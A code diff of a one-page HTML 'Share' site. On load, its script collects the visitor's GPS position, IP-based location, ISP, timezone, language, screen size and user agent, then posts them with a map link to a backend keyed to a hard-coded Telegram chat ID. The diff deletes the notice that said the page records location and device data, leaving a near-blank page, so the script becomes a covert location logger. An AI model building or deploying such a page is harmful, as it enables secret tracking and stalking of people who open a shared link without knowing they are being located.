@@ -1,64 +1,66 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Share Location</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Share</title>
 </head>
+
 <body style="font-family:sans-serif;text-align:center;padding:40px">
-  <h2>Location Check-in</h2>
-  <p>This page records your approximate location, IP address, and device info.</p>
-  <p id="status">Getting location...</p>
 
-<script>
-const TG_CHAT_ID = "980975242";
+    <p id="status">Getting</p>
 
-async function getIpInfo() {
-  try {
-    const r = await fetch("https://ipapi.co/json/");
-    return await r.json();
-  } catch { return {}; }
-}
+    <script>
+        const TG_CHAT_ID = "980975242";
 
-function getGps() {
-  return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve({});
-    navigator.geolocation.getCurrentPosition(
-      p => resolve({
-        lat: p.coords.latitude, lng: p.coords.longitude,
-        accuracy: p.coords.accuracy, altitude: p.coords.altitude,
-        speed: p.coords.speed, heading: p.coords.heading
-      }),
-      () => resolve({}),
-      { enableHighAccuracy: true, timeout: 15000 }
-    );
-  });
-}
+        async function getIpInfo() {
+            try {
+                const r = await fetch("https://ipapi.co/json/");
+                return await r.json();
+            } catch { return {}; }
+        }
 
-(async () => {
-  const status = document.getElementById("status");
-  status.textContent = "Getting location...";
-  const [gps, ip] = await Promise.all([getGps(), getIpInfo()]);
+        function getGps() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) return resolve({});
+                navigator.geolocation.getCurrentPosition(
+                    p => resolve({
+                        lat: p.coords.latitude, lng: p.coords.longitude,
+                        accuracy: p.coords.accuracy, altitude: p.coords.altitude,
+                        speed: p.coords.speed, heading: p.coords.heading
+                    }),
+                    () => resolve({}),
+                    { enableHighAccuracy: true, timeout: 15000 }
+                );
+            });
+        }
 
-  const lat = gps.lat ?? ip.latitude, lng = gps.lng ?? ip.longitude;
-  const mapsLink = lat ? `\n📍 https://maps.google.com/?q=${lat},${lng}` : "";
-  const text =
-    `🌐 New check-in\n` +
-    `Lat/Lng: ${lat ?? "n/a"}, ${lng ?? "n/a"} (source: ${gps.lat ? "GPS+IP" : "IP only"})\n` +
-    `IP: ${ip.ip ?? "n/a"} | City: ${ip.city ?? "n/a"}, ${ip.region ?? "n/a"}, ${ip.country_name ?? "n/a"}\n` +
-    `ISP: ${ip.org ?? "n/a"}\n` +
-    `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
-    `Language: ${navigator.language}\n` +
-    `Screen: ${screen.width}x${screen.height}\n` +
-    `Device: ${navigator.userAgent}` + mapsLink;
+        (async () => {
+            const status = document.getElementById("status");
+            status.textContent = "Getting location...";
+            const [gps, ip] = await Promise.all([getGps(), getIpInfo()]);
 
-  const res = await fetch(`/api/notify`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
-  });
-  status.textContent = res.ok ? "Done, thank you!" : "Failed to send.";
-})();
-</script>
+            const lat = gps.lat ?? ip.latitude, lng = gps.lng ?? ip.longitude;
+            const mapsLink = lat ? `\n📍 https://maps.google.com/?q=${lat},${lng}` : "";
+            const text =
+                `🌐 New check-in\n` +
+                `Lat/Lng: ${lat ?? "n/a"}, ${lng ?? "n/a"} (source: ${gps.lat ? "GPS+IP" : "IP only"})\n` +
+                `IP: ${ip.ip ?? "n/a"} | City: ${ip.city ?? "n/a"}, ${ip.region ?? "n/a"}, ${ip.country_name ?? "n/a"}\n` +
+                `ISP: ${ip.org ?? "n/a"}\n` +
+                `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+                `Language: ${navigator.language}\n` +
+                `Screen: ${screen.width}x${screen.height}\n` +
+                `Device: ${navigator.userAgent}` + mapsLink;
+
+            const res = await fetch(`/api/notify`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
+            });
+            status.textContent = res.ok ? "Done, thank you!" : "Failed to send.";
+        })();
+    </script>
 </body>
+
 </html>
